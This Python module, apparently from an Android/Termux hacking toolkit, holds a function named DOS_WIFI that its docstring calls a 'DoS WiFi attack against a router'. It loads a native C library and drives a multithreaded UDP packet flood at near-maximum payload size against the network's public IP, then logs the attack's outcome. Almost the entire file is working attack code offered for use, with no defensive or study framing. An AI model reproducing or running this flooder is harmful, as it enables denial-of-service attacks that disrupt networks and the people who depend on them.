# Copyright (c) 2026 SugaBlaz
# This software is released under the MIT License.
# https://github.com/SugaBlaz/PRJ_SUGA-27-ANDROID-TERMUX

import multiprocessing
import os
import ctypes
from blessed import Terminal

import helper.network as network

term = Terminal()

LIB_FILE_WIFI = None
C_FILE_WIFI = None

TERMINAL = None
    
def init(terminal):
    global TERMINAL
    TERMINAL = terminal

def log(msg: str):
    """Safely logs to terminal instance or stdout fallback."""
    if TERMINAL and hasattr(TERMINAL, "_log"):
        TERMINAL._log(msg)
    else:
        print(msg, flush=True)

# C progress callback signature: void callback(int delta)
PROGRESS_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.c_int)

def set_dirs(cfilewifi, libfilewifi):
    global LIB_FILE_WIFI, C_FILE_WIFI

    C_FILE_WIFI, LIB_FILE_WIFI = cfilewifi, libfilewifi

def DOS_WIFI(
    port: int,
    max_i: int,
    payload_bytes: int
):
    """
    Launches a DoS WiFi attack against a router. (Needs to be connected to the router)
    """

    # ---------------------------------------------------------
    # Check native library
    # ---------------------------------------------------------

    needs_recompile = False

    if not os.path.exists(LIB_FILE_WIFI):
        needs_recompile = True

    elif os.path.exists(C_FILE_WIFI):
        c_mtime = os.path.getmtime(C_FILE_WIFI)
        lib_mtime = os.path.getmtime(LIB_FILE_WIFI)

        if c_mtime > lib_mtime:
            log("[*] Detected changes in fast_packet_wifi.c!")
            needs_recompile = True

    if needs_recompile:
        log(
            "[!!] FATAL ERROR: The native WiFi engine is "
            "outdated or not compiled. Run download_dependencies() first."
        )
        return -1

    ip = network.get_public_ip()

    # ---------------------------------------------------------
    # Basic validation
    # ---------------------------------------------------------

    if port < 1 or port > 65535:
        log("[!] Invalid port.")
        return -1

    if max_i <= 0:
        log("[!] Packet count must be greater than 0.")
        return -1

    if payload_bytes <= 0:
        payload_bytes = 65000

    if payload_bytes > 65506:
        log("[!] UDP payload cannot exceed 65507 bytes.")
        return -1

    # ---------------------------------------------------------
    # Thread count
    # ---------------------------------------------------------

    num_cores = multiprocessing.cpu_count()

    if num_cores < 1:
        num_cores = 1

    # Don't create more workers than packets.
    num_threads = min(num_cores, max_i)

    log(
        f"[+] Launching native C packet engine "
        f"across {num_threads} threads "
        f"({max_i:,} total packets)..."
    )

    # ---------------------------------------------------------
    # Load shared library
    # ---------------------------------------------------------

    try:
        c_lib = ctypes.CDLL(
            LIB_FILE_WIFI,
            use_errno=True
        )
    except OSError as exc:
        log(f"[!] Failed to load WIFI native library: {exc}")
        return 

    # ---------------------------------------------------------
    # Configure C function
    # ---------------------------------------------------------

    c_lib.start_packet_generator.argtypes = [
        ctypes.c_char_p,   # IP
        ctypes.c_int,      # Port
        ctypes.c_int64,    # TOTAL packets
        ctypes.c_int,      # Threads
        ctypes.c_int       # Payload size
    ]

    c_lib.start_packet_generator.restype = ctypes.c_int

    # ---------------------------------------------------------
    # Execute native engine
    # ---------------------------------------------------------

    try:
        result = c_lib.start_packet_generator(
            ip.encode("utf-8"),
            int(port),
            int(max_i),
            int(num_threads),
            int(payload_bytes)
        )

    except KeyboardInterrupt:
        # Normally the C SIGINT handler catches Ctrl+C first.
        # This is just a fallback.
        log("[!] Keyboard interrupt received.")
        
        return

    # ---------------------------------------------------------
    # Handle C return code
    # ---------------------------------------------------------

    if result == 0:
        log("[+] WiFi DoS attack completed.")

    elif result == 1:
        log("[!] WiFi DoS attack interrupted by user.")

    else:
        log("[!] WiFi DoS attack ended with an error.")